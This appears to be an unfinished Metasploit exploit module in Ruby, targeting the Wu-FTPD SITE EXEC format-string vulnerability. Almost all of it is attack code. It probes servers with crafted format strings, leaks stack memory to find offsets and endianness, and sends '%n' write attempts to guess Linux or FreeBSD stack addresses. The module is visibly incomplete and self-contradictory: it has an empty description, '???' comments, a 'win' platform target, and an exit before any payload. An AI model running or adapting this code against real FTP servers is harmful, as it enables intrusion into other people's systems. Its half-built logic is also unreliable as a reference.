##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Multi::Ftp::WuFTPD_SITE_EXEC < Msf::Exploit::Remote

	include Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Wu-FTPD SITE EXEC format string exploit',
			'Description'    => %q{
			},
			'Author'         => [ 'vlad902' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '1387'],

				],
			'Privileged'     => false,					# ???
			'Payload'        =>
				{
					'Space'    => 1024,				# ???
					'BadChars' => "\x00\x20\x0a\x0d\x25\xff",	# ???
				},

			'Targets'        => 
				[
					[ 
						'Automatic',
						{
							'Platform' => 'win'
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def check
		connect_login
		buf = send_cmd( ['SITE EXEC', "\xff\x00|%.50d|"])
		disconnect	
		if buf =~ /^200-\|\d{50,50}\|/
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end
	
	MAX_FTPD_SIZE = 500

#
# fmt_step + 2s should be fmt_step + 1?
#
	def exploit
# Begin != 0
		@fmt_begin, @fmt_end = 300, 1300
		(@fmt_step, @fmt_rep) = findsteprep(@fmt_begin, @fmt_end, MAX_FTPD_SIZE, 4) { |min, step|
# Why 2?
			sprintf("%%%i\$x..", min + step)
		}[2]
		print_status "FmtStep: #{@fmt_step}"
		print_status "FmtRep: #{@fmt_rep}"

		os_db = 
			[
				[ 'Linux / ia32',	'V', 0xc0000000, 0x80480000 ],
				[ 'FreeBSD / ia32',	'V', 0xbfc00000, 0x80480000 ],
			]

		connect_login
		brute_offset

		os_db.delete_if { |x| x[1] != @endian }

		print_status "Possible targets:"
		os_db.each { |x| print_status "  #{x[0]}" }

# Try the stack tops of operating systems that have so far survived the endianness cut-off
#   to further determine what they are.
		os_db.each { |os|
			stacktop = os[2];

			str = 'e' * @fmt_align + parse_address(stacktop - 4)
			begin
# SITE EXEC eeBFFFFFFC%.5u%1196$n 
				send_cmd(['SITE EXEC', sprintf("%s%%.%iu%%%i\$n", str, rand(0x130) + 1, @fmt_offset)])
			rescue
				print_status "Trying 0x#{sprintf('%.8x', stacktop)} (#{os[0]})... Failed"
				connect_login(true, false)
			else
				print_status "Trying 0x#{sprintf('%.8x', stacktop)} (#{os[0]})... Success"
				os_db.delete_if { |x| x[2] != stacktop }
				break
			end
		}

		print_status "Possible targets:"
		os_db.each { |x| print_status "  #{x[0]}" }

		exit
	end
	
	def parse_address(addr)
		str = ""

# XXX: endian problems!
		while addr != 0
			if (addr & 0xff) == 0xff || (addr & 0xff) == 0x25
				str += (addr & 0xff).chr
			end
			str += (addr & 0xff).chr
			addr >>= 8
		end

		return str
	end

	def make_buf(prefix, postfix, base, rep, step, char, seperator=[])
		request = prefix
		0.upto(rep - 1) { |counter|
			request += sprintf("%%%i\$%s", base + (counter * step), char) 
			if seperator.length > 0
				request += seperator[rand(seperator.length).floor]
			end
		}
		if seperator.length > 0
			request.chop!
		end
		request += postfix
		if request.length > MAX_FTPD_SIZE
			print_status "#{request.inspect} (#{request.length}) is longer then #{MAX_FTPD_SIZE}!"
		end

		return request
	end

#
# Determine alignment and offset on the stack.
#
	def brute_offset
		counter, counter_start, rep = @fmt_begin, 0, []
		@endian = nil
		
		ret = []
		while counter < @fmt_end
			str = Rex::Text::pattern_create((@fmt_step + 2) * 4, ["ABCDEF", "GHIJKLMNOPQRSTU", "VWX", "YZzyxwv"])
#			seperator = ("\xd5".."\xfe").to_a  
			seperator = [ "|" ]

# XXX: Properly handle getting both replies
			reply = send_cmd(['SITE EXEC',  make_buf(str, "", counter, @fmt_rep, @fmt_step, "x", seperator)], true)
			self.sock.get_once

			reply.slice!(0..(str.length + 3))		# 200-#{str}
			reply.chomp!.chomp!				# \r\n

			db = reply.split(seperator.join)

# Find possible hits...
			db.each_index { |idx|
				blk = db[idx]
				next if blk.length != 8

				str1 = blk.unpack("A2A2A2A2").collect {|x|x.hex}.pack("C4")	# Big Endian
				str2 = str1.reverse						# Little Endian

				align = -1
				loop {
					align = str.index(str1, align + 1)
					break if !align
					ret.push [counter, idx, align]
					@endian = 'N'
				}
				align = -1
				loop {
					align = str.index(str2, align + 1)
					break if !align
					ret.push [counter, idx, align]
					@endian = 'V'
				}
			}

			counter += @fmt_step * @fmt_rep
		end

		@fmt_align = ret[0][2] % 4 
		@fmt_offset = ret[0][0] + (ret[0][1] * @fmt_step) - ((ret[0][2] - @fmt_align) / 4)

#
# If we receieved mutliple possible results re-scan them to find one that works. 
#
		if ret.length > 1
# XXX: Sub-optimal, put all in one request
			print_status "#{ret.length} results received"
			@endian = nil
			ret.each { |ret|
				@fmt_align = ret[2] % 4 
				@fmt_offset = ret[0] + (ret[1] * @fmt_step) - ((ret[2] - @fmt_align) / 4)

# XXX: Properly handle getting both replies
				reply = send_cmd(['SITE EXEC', "a" * @fmt_align + sprintf("ABCD%%%i\$x", @fmt_offset)])
				self.sock.get_once

				if reply =~ /44434241/
					@endian = 'V'
					break
				elsif reply =~ /41424344/
					@endian = 'N'
					break
				end
			}
			if !@endian
				print_status "No results succeeded!"
			end
		end

		print_status "Align: #{@fmt_align}"
		print_status "Offset: #{@fmt_offset}"

		if @endian.eql?('N')
			print_status "Big endian"
		else
			print_status "Little endian"
		end
	end
	
#
# Returns 3 values:
#  1) Highest step and highest rep possible
#  2) Step and rep combination that cover the most space
#  3) Step and rep combination that cover the least space over max_size
#
	def findsteprep(min, max, max_size, step_len)
		size = max - min
		
		lowest = size
		step_high = rep_high = hit_high = hit_low = 0
		hit_step_high = hit_step_low = hit_rep_high = hit_rep_low = 0
		1.upto(size - 1) { |step|
# + 1 for the ending delimeter being cut off
			temp_len = max_size - ((step + 2) * step_len) + 1
			
			temp, rep = 0, -1
			while temp < temp_len
				temp += yield(min, step * (rep + 1)).length
				rep += 1
			end
			break if rep <= 0
			
			temp = (size.to_f / (step.to_f * rep.to_f)).to_i
			step_high = [step, step_high].max
			rep_high = [rep, rep_high].max
			if temp < lowest
				lowest = temp
				hit_step_low = step
				hit_rep_low = rep
				hit_low = step * rep
			end
			if step * rep > hit_high
				hit_step_high = step
				hit_rep_high = rep
				hit_high = step * rep
			end
		}
		hit_step_low.downto(1) { |step|
			hit_rep_low.downto(1) { |rep|
				if (size.to_f / (step.to_f * rep.to_f)).to_i == lowest &&
					step * rep < hit_low
					hit_step_low = step
					hit_rep_low = rep
					hit_low = step * rep
				end
			}
		}
		
		return [[step_high, rep_high], [hit_step_high, hit_rep_high], [hit_step_low, hit_rep_low]]
	end
end
end	
